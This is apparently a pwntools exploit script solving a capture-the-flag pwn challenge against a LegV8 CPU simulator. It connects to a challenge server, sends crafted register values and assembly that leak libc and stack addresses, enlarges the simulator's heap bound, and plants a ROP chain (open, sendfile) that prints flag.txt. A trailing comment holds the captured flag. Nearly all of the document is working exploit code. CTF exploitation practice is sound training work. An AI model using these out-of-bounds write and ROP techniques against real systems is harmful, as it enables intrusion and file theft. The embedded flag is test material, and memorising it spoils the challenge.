#!/usr/bin/env python3

from pwn import *
import assembler

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# context.log_level = 'DEBUG'
# context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu-22.04'.split()
# Using windows terminal split, set New Instance Behavior to Attach to...


remote_connection = "nc vm.daotao.antoanso.org 33089".split()
local_port = 5000

gdbscript = '''
init-pwndbg
handle SIGALRM noignore
handle SIGTERM pass
# source ./gdb_patch.py
# patch_function usleep
# brva 0x1985
# c
# signal SIGALRM

'''
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)

def start():
    if args.REMOTE:
        return remote(remote_connection[1], int(remote_connection[2]))
    elif args.LOCAL:
        return remote("localhost", local_port)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        return process([exe.path])

def GDB():
    if not args.LOCAL and not args.REMOTE:
        gdb.attach(p, gdbscript=gdbscript)
        pause()
    if args.LOCAL:
        pid = gdb.attach(('0.0.0.0', 9090), exe=f'./chall_patched', gdbscript=gdbscript)
        pause()


X = [0]*31
X[12] = 1
X[13] = 5

X[15] = 0x15
X[17] = 0x33923 # pop_rcx
X[18] = 0xc774d # pop_rdx
X[19] = 0xeffb0 # sendfile
X[20] = 0x2590f # pop_rsi
X[21] = 0x7478742e67616c66 # flag
X[22] = 0x100
X[23] = 0xeb110 # open
X[24] = 0x23796 # pop_rdi
X[25] = 0x1cf5c0
X[26] = 0x2420
X[27] = 0x688
X[28] = 0x00007fffffffffff
X[29] = 0x330
X[30] = 0x50000


p = start()
pause()
GDB()
sla(b'How much memory do you want for your program? ', f'{0x100}'.encode())
sla(b'Do you want to set initial values for registers? (y/n): ', b'y')
for i in range(31):
    sla(b'=', f'{X[i]}'.encode())

assembler = assembler.LegV8Assembler()
# make a loop to trigger signal alarm
assembly_code = '''
LOOP:
    SUB X15, X15, X12
    CBZ X15, EXPLOIT
    CBZ XZR, LOOP
'''
assembly_code += '''
EXPLOIT:
    // X0 = sim->memory
    LDUR X0, [X30, #-40]
    // X1 = heap_base
    SUB X1, X0, X29
    // sim->heap_size = 0x7fffffffffff
    STUR X28, [X30, #-32]
    // X2 = lbc_addr
    ADD X2, X27, XZR
    ADD X2, X2, X30
    SUB X2, X2, X29
    // X3 = libc_leak
    LDUR X3, [X2, #0]
    // X4 = environ_addr
    ADD X4, X3, X26
    ADD X4, X4, X30
    SUB X4, X4, X0
    // X5 = environ_leak
    LDUR X5, [X4, #0]
    // X6 = libc_base
    SUB X6, X3, X25
    // X24 = pop_rdi
    ADD X24, X6, X24
    // X8 = flag.txt addr
    ADD X8, X5, X29
    // X10 = real addr
    ADD X10, X8, XZR
    ADD X8, X8, X30
    SUB X8, X8, X0
    STUR X21, [X8, #0]
    STUR XZR, [X8, #8]
    // X9 = rip chain addr
    SUB X9, X5, X22
    ADD X9, X9, X30
    SUB X9, X9, X0
    STUR X24, [X9, #0]
    STUR X10, [X9, #8]
    // X20 = pop_rsi
    ADD X20, X6, X20
    STUR X20, [X9, #16]
    STUR XZR, [X9, #24]
    // X23 = open
    ADD X23, X6, X23
    STUR X23, [X9, #32]
    // call sendfile(1, 3, 0, 0x100)
    STUR X24, [X9, #40]
    // X12 = 1
    STUR X12, [X9, #48]
    STUR X20, [X9, #56]
    STUR X13, [X9, #64]

    // X18 = pop_rdx
    ADD X18, X6, X18
    STUR X18, [X9, #72]
    STUR XZR, [X9, #80]

    // X17 = pop_rcx
    ADD X17, X6, X17
    STUR X17, [X9, #88]
    STUR X22, [X9, #96]

    ADD X19, X6, X19
    STUR X19, [X9, #104]
'''
binary_code_bytes = assembler.assemble_bytes(assembly_code)
print(len(binary_code_bytes))
sa(b':\n', binary_code_bytes)
p.interactive()

# HCMUS-CTF{gO0d_THiNgs_c0Me_t0_THOse_WhO_W4iT_;)_a172b03e439be8c373bee2086088e5d8}
